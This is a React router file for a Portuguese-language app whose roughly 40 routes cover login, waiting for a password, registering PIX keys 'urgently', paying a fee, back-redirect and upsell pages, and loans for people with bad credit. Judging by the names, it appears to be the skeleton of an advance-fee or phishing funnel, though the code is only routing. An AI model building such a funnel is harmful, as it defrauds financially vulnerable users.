import { StrictMode } from 'react'
import { createRoot } from 'react-dom/client'
import './index.css'
import { createBrowserRouter } from 'react-router-dom';
import { Home } from './pages/home';
import { Login } from './pages/login';
import { Loading } from './pages/loading';
import { Menu } from './pages/menu';
import { SaqueDigital } from './pages/saque-digital';
import { ContaBancaria } from './pages/conta-bancaria';
import { CadastrarChaves } from './pages/cadastrar-chave';
import { SaqueAniversario } from './pages/saque-aniversario';
import { Info } from './pages/info';
import { Perfil } from './pages/perfil';
import { AguardarSenha } from './pages/aguardar-senha';
import { NotaFiscal } from './pages/nota-fiscal';
import { VerificarDados } from './pages/verificar-dados';
import { CadastrarChavesUrgente } from './pages/cadastrar-chave-urgente';
import { SelecionarMetodo } from './pages/selecionar-metodo';
import { PagamentoTarifa } from './pages/pagamento-tarifa';
import { CopiaNao } from './pages/copianao';
import { BackRedirectDiscount } from './pages/backredirect';
import { ProcessandoPagamento } from './pages/processar-pagamento';
import { Upsell } from './pages/upsell';
import { Perguntas } from './pages/perguntas';
import App from './App';
import { Layout } from './components/layout';
import { Travado } from './pages/travado';
import { LoginUpsell } from './pages/login-upsell';
import { LoadingUpsell } from './pages/loading-upsell';
import { PagamentoUpsell } from './pages/pagamento-upsell';
import { BackRedirectUpsell } from './pages/backredirect-upsell';
import { Upsellbackredirect } from './pages/upsellbackredirect';
import { Propostas } from './pages/propostas';
import { Ofertas } from './pages/ofertas';
import { Emprestimo } from './pages/emprestimo';
import { CarregandoEmprestimo } from './pages/carregando-emprestimo';
import { Resumo } from './pages/resumo';
import { TermosEmprestimo } from './pages/termos-emprestimo';
import { Gerente } from './pages/gerente';
import { OfertaCredito } from './pages/oferta-credito';
import { AberturaConta } from './pages/abertura-contas';
import { CadastroPagamento } from './pages/cadastro-pagamento';
import { RevisaoPagamento } from './pages/revisao-pagamento';

export const router = createBrowserRouter([
  {
    element: <Layout />, // Usa o MainLayout como layout principal
    children: [
      { path: "/", element: <Home /> },
      { path: "/login", element: <Login /> },
      { path: "/carregando", element: <Loading /> },
      { path: "/menu", element: <Menu /> },
      { path: "/saquedigital", element: <SaqueDigital /> },
      { path: "/contabancaria", element: <ContaBancaria /> },
      { path: "/cadastrarchave", element: <CadastrarChaves /> },
      { path: "/cadastrourgente", element: <CadastrarChavesUrgente /> },
      { path: "/saqueaniversario", element: <SaqueAniversario /> },
      { path: "/info", element: <Info /> },
      { path: "/perfil", element: <Perfil /> },
      { path: "/aguardarsenha", element: <AguardarSenha /> },
      { path: "/notafiscal", element: <NotaFiscal /> },
      { path: "/verificardados", element: <VerificarDados /> },
      { path: "/selecionarmetodo", element: <SelecionarMetodo /> },
      { path: "/pagamentotarifa", element: <PagamentoTarifa /> },
      { path: "/copianao", element: <CopiaNao /> },
      { path: "/backredirect", element: <BackRedirectDiscount /> },
      { path: "/processarpagamento", element: <ProcessandoPagamento /> },
      { path: "/upsell", element: <Upsell /> },
      { path: "/perguntas", element: <Perguntas /> },
      { path: "/travado", element: <Travado /> },
      { path: "/loginupsell", element: <LoginUpsell /> },
      { path: "/carregandoupsell", element: <LoadingUpsell /> },
      { path: "/pagamentoupsell", element: <PagamentoUpsell /> },
      { path: "/backredirectupsell", element: <BackRedirectUpsell /> },
      { path: "/upsellbackredirect", element: <Upsellbackredirect /> },

      // fazer página de carregamento depois que a pessoa faz login pra concientizar ela do emprestimo para negativados



      { path: "/propostas", element: <Propostas /> },
      { path: "/ofertas", element: <Ofertas /> },
      { path: "/emprestimo", element: <Emprestimo /> },
      { path: "/resumo", element: <Resumo /> },
      { path: "/carregandoemprestimo", element: <CarregandoEmprestimo /> },
      { path: "/termosemprestimo", element: <TermosEmprestimo /> },
      { path: "/gerente", element: <Gerente /> },
      { path: "/cadastropagamento", element: <CadastroPagamento /> },
      { path: "/revisaopagamento", element: <RevisaoPagamento /> },
      { path: "/aberturaconta", element: <AberturaConta /> },
      { path: "/ofertacredito", element: <OfertaCredito /> },




    ],
  },
]);



createRoot(document.getElementById('root')!).render(
  <StrictMode>
    <App />
  </StrictMode>,
)
